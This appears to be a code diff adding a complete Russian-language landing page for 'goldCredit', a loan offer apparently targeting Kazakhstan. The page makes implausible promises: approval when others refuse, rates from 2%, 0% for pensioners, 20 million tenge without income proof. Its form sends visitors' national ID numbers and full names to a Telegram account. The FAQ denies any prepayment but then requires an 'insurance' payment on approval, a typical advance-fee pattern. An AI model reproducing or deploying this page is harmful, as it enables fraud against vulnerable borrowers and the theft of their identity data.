@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>goldCredit</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to bottom, #001F3F, #F7C948);
+      color: #fff;
+    }
+    header {
+      background-color: #001F3F;
+      padding: 50px 20px 30px;
+      text-align: center;
+    }
+    header h1 {
+      font-size: 40px;
+      margin: 0;
+      color: gold;
+    }
+    header p {
+      font-size: 20px;
+      margin-top: 10px;
+    }
+    .form-section {
+      background-color: #fff;
+      color: #000;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    .form-section input {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    .form-section button {
+      padding: 10px 25px;
+      background-color: #001F3F;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .info-section {
+      background-color: #F7C948;
+      color: #000;
+      padding: 40px 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+    .info-card {
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+      padding: 20px;
+      max-width: 300px;
+      flex: 1;
+    }
+    .faq-section {
+      background-color: #001F3F;
+      padding: 40px 20px;
+      color: white;
+    }
+    .faq-section h2 {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .faq-section .faq-item {
+      margin-bottom: 20px;
+    }
+    .faq-section .faq-item h3 {
+      margin: 0 0 10px;
+      color: gold;
+    }
+    .video-section {
+      background-color: #fff;
+      color: #000;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    .video-section h2 {
+      color: #001F3F;
+      margin-bottom: 30px;
+    }
+    .video-grid {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 20px;
+    }
+    .video-grid video {
+      width: 300px;
+      height: 180px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>goldCredit</h1>
+    <p>Мы одобрим кредит пока другие вам отказывают. Онлайн-заявка за 2 минуты, ставка от 2% годовых.</p>
+  </header>
+
+  <section class="form-section">
+    <h2>Заполните заявку</h2>
+    <form action="https://t.me/onlinecreditttkz">
+      <input type="text" name="iin" placeholder="ИИН" required><br>
+      <input type="text" name="name" placeholder="Ф.И.О" required><br>
+      <button type="submit">Отправить заявку</button>
+    </form>
+  </section>
+
+  <section class="info-section">
+    <div class="info-card">
+      <h3>Одобрение от 15 минут</h3>
+      <p>Получите предварительное решение по кредиту за 15–30 минут.</p>
+    </div>
+    <div class="info-card">
+      <h3>До 20 000 000 ₸</h3>
+      <p>Сумма кредита до 20 млн ₸. Без справки о доходах.</p>
+    </div>
+    <div class="info-card">
+      <h3>0% для пенсионеров</h3>
+      <p>Специальные условия – кредит под 0%</p>
+    </div>
+  </section>
+
+  <section class="video-section">
+    <h2>Отзывы клиентов</h2>
+    <div class="video-grid">
+      <video controls>
+        <source src="video1.mp4" type="video/mp4">
+        Ваш браузер не поддерживает видео.
+      </video>
+      <video controls>
+        <source src="video2.mp4" type="video/mp4">
+        Ваш браузер не поддерживает видео.
+      </video>
+      <video controls>
+        <source src="video3.mp4" type="video/mp4">
+        Ваш браузер не поддерживает видео.
+      </video>
+      <video controls>
+        <source src="video4.mp4" type="video/mp4">
+        Ваш браузер не поддерживает видео.
+      </video>
+    </div>
+  </section>
+
+  <section class="faq-section">
+    <h2>Часто задаваемые вопросы</h2>
+    <div class="faq-item">
+      <h3>Какие документы нужны для оформления?</h3>
+      <p>Достаточно ИИН и удостоверения личности. Никаких справок.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Как быстро придёт одобрение?</h3>
+      <p>В течение 15–30 минут после заполнения заявки.</p>
+    </div>
+    <div class="faq-item">
+      <h3>Нужна ли предоплата?</h3>
+      <p>Нет. Вы оплачиваете только страховку при одобрении, по закону.</p>
+    </div>
+  </section>
+</body>
+</html>
